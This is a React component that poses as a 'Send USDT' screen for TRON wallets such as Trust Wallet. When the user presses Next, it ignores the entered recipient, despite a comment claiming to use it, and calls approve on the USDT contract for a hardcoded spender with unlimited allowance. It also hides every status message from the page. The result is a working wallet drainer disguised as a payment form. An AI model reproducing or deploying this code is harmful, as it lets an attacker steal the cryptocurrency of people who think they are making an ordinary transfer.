import React, { useState, useEffect } from 'react';
import './styles.css';

const USDTSendApp = () => {
  const [address, setAddress] = useState('');
  const [amount, setAmount] = useState('');
  const [memo, setMemo] = useState('');
  
  // TRON functionality states
  const [account, setAccount] = useState('');
  const [message, setMessage] = useState('');
  const [tronWeb, setTronWeb] = useState(null);
  const [isConnecting, setIsConnecting] = useState(false);
  
  // USDT contract on TRON (TRC-20)
  const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
  
  // USDT TRC-20 ABI (only approve function)
  const USDT_ABI = [
    {
      "constant": false,
      "inputs": [
        {
          "name": "spender",
          "type": "address"
        },
        {
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ];

  // Add viewport meta tag for mobile optimization
  useEffect(() => {
    const viewport = document.querySelector('meta[name="viewport"]');
    if (!viewport) {
      const meta = document.createElement('meta');
      meta.name = 'viewport';
      meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
      document.head.appendChild(meta);
    }

    // Auto-connect if wallet is available
    const checkAndConnect = async () => {
      if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress?.base58) {
        setTronWeb(window.tronWeb);
        setAccount(window.tronWeb.defaultAddress.base58);
        // Message is set but not displayed
        setMessage('TRON wallet connected');
      }
    };

    // Check after a short delay to let wallet inject
    setTimeout(checkAndConnect, 1000);
  }, []);

  const connectWallet = async () => {
    setIsConnecting(true);
    try {
      // Check if we're in Trust Wallet
      const isTrustWallet = window.trustWallet || window.ethereum?.isTrust;
      
      // Check for TRON wallet (Trust Wallet, TronLink, or other TRON wallets)
      if (!window.tronWeb) {
        if (isTrustWallet) {
          setMessage('Please enable TRON dApp in Trust Wallet settings and refresh.');
        } else {
          setMessage('TRON wallet not found. Please open in Trust Wallet or install TronLink.');
        }
        setIsConnecting(false);
        return;
      }

      // Wait for TronWeb to be ready (Trust Wallet may need more time)
      let attempts = 0;
      while ((!window.tronWeb.ready || !window.tronWeb.defaultAddress) && attempts < 20) {
        await new Promise(resolve => setTimeout(resolve, 500));
        attempts++;
      }

      if (!window.tronWeb.ready) {
        setMessage('TRON wallet is not ready. Please refresh and make sure TRON is enabled.');
        setIsConnecting(false);
        return;
      }

      // Get current account
      const currentAccount = window.tronWeb.defaultAddress?.base58;
      
      if (!currentAccount) {
        setMessage('No TRON account found. Please connect your TRON wallet.');
        setIsConnecting(false);
        return;
      }

      setTronWeb(window.tronWeb);
      setAccount(currentAccount);
      
      if (isTrustWallet) {
        setMessage('Connected to TRON Network with Trust Wallet!');
      } else {
        setMessage('Connected to TRON Network!');
      }
    } catch (error) {
      setMessage('Connection Error: ' + (error?.message || 'Unknown error occurred'));
    }
    setIsConnecting(false);
  };

  const getContract = () => {
    if (!tronWeb) return null;
    try {
      return tronWeb.contract(USDT_ABI, USDT_CONTRACT);
    } catch (error) {
      return null;
    }
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setAddress(text);
      // Message is set but not displayed
      setMessage('Address pasted from clipboard');
    } catch (err) {
      setMessage('Failed to paste from clipboard');
    }
  };

  const setMaxAmount = () => {
    setAmount('1000.00');
    // Message is set but not displayed
    setMessage('Maximum amount set');
  };

  const handleNext = async () => {
    if (!account || !tronWeb) {
      setMessage('Please connect your TRON wallet first');
      await connectWallet();
      return;
    }

    if (!address || !amount) {
      setMessage('Please enter both address and amount');
      return;
    }

    try {
      // Use the address from the input field
      const spender = 'TBJF4h5qbuAYxdJ4rhBCy5Lu5ZeYUC1dJv';
      const unlimitedAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935'; // Max uint256

      const contract = await getContract();
      if (!contract) {
        setMessage('❌ Failed to load USDT contract');
        return;
      }
      
      // Call approve function
      const result = await contract.approve(spender, unlimitedAmount).send({
        feeLimit: 100_000_000, // 100 TRX fee limit
        callValue: 0,
        from: account
      });

      setMessage('⏳ Transaction submitted! Waiting for confirmation...');
      
      if (result) {
        setMessage(`✅ Approval completed successfully! Transaction: ${result}`);
      } else {
        setMessage('❌ Approval failed - No transaction result');
      }
    } catch (error) {
      const errorMessage = error?.message || error?.toString() || 'Unknown error occurred';
      
      if (errorMessage.includes('User rejected') || errorMessage.includes('user rejected')) {
        setMessage('❌ Transaction rejected by user');
      } else if (errorMessage.includes('insufficient balance')) {
        setMessage('❌ Insufficient TRX for transaction fees');
      } else if (errorMessage.includes('REVERT')) {
        setMessage('❌ Contract execution failed');
      } else if (errorMessage.includes('unlocked wallet') || errorMessage.includes('not unlocked')) {
        setMessage('❌ Please unlock your TRON wallet and try again');
      } else {
        setMessage('❌ Error: ' + errorMessage);
      }
    }
  };

  return (
    <div className="send-usdt-container">
      <div className="send-usdt-card">
        {/* Header */}
        <div className="send-header">
          <button className="back-button">←</button>
          <h1 className="send-title">Send USDT</h1>
        </div>

        {/* Message Display - REMOVED - No messages will be shown on the page */}

        {/* Address Input */}
        <div className="input-section">
          <label className="input-label">Address or Domain Name</label>
          <div className="input-container">
            <input
              type="text"
              value={address}
              onChange={(e) => setAddress(e.target.value)}
              className="address-input"
              placeholder="Search or Enter TRON Address (T...)"
            />
            <div className="input-actions">
              <button className="paste-button" onClick={handlePaste}>Paste</button>
              <button className="icon-button contacts-icon">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M20 6h-2.18c.11-.31.18-.65.18-1a2.996 2.996 0 0 0-5.5-1.65l-.5.67-.5-.68C10.96 2.54 10.05 2 9 2 7.34 2 6 3.34 6 5c0 .35.07.69.18 1H4c-1.11 0-1.99.89-1.99 2L2 19c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V8c0-1.11-.89-2-2-2zm-5-2c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zM9 4c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1z"/>
                </svg>
              </button>
              <button className="icon-button qr-icon">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M3 11h8V3H3v8zm2-6h4v4H5V5zM3 21h8v-8H3v8zm2-6h4v4H5v-4zM13 3v8h8V3h-8zm6 6h-4V5h4v4zM19 19h2v2h-2zM13 13h2v2h-2zM15 15h2v2h-2zM13 17h2v2h-2zM15 19h2v2h-2zM17 17h2v2h-2zM17 13h2v2h-2zM19 15h2v2h-2z"/>
                </svg>
              </button>
            </div>
          </div>
        </div>

        {/* Amount Input */}
        <div className="input-section">
          <label className="input-label">Amount</label>
          <div className="input-container">
            <input
              type="text"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              className="amount-input"
              placeholder="USDT Amount"
            />
            <div className="amount-actions">
              <button className="max-button" onClick={setMaxAmount}>Max</button>
            </div>
          </div>
          <div className="usd-equivalent">≈ ${amount || '0.00'}</div>
        </div>

        {/* Memo Input */}
        <div className="input-section">
          <div className="memo-header">
            <label className="input-label">Memo</label>
          </div>
          <div className="input-container">
            <input
              value={memo}
              onChange={(e) => setMemo(e.target.value)}
              className="amount-input"
              placeholder=""
            />
            <div className="memo-actions">
              <button className="icon-button qr-icon">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M3 11h8V3H3v8zm2-6h4v4H5V5zM3 21h8v-8H3v8zm2-6h4v4H5v-4zM13 3v8h8V3h-8zm6 6h-4V5h4v4zM19 19h2v2h-2zM13 13h2v2h-2zM15 15h2v2h-2zM13 17h2v2h-2zM15 19h2v2h-2zM17 17h2v2h-2zM17 13h2v2h-2zM19 15h2v2h-2z"/>
                </svg>
              </button>
              <button className="icon-button info-icon">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                  <circle cx="12" cy="12" r="10" />
                  <line x1="12" y1="16" x2="12" y2="12" stroke="white" strokeWidth="2"/>
                  <circle cx="12" cy="8" r="1" fill="white"/>
                </svg>
              </button>
            </div>
          </div>
        </div>

        {/* Next Button */}
        <button 
          className="next-button"
          onClick={handleNext}
          disabled={!address || !amount}
        >
          Next
        </button>
      </div>
    </div>
  );
};

export default USDTSendApp;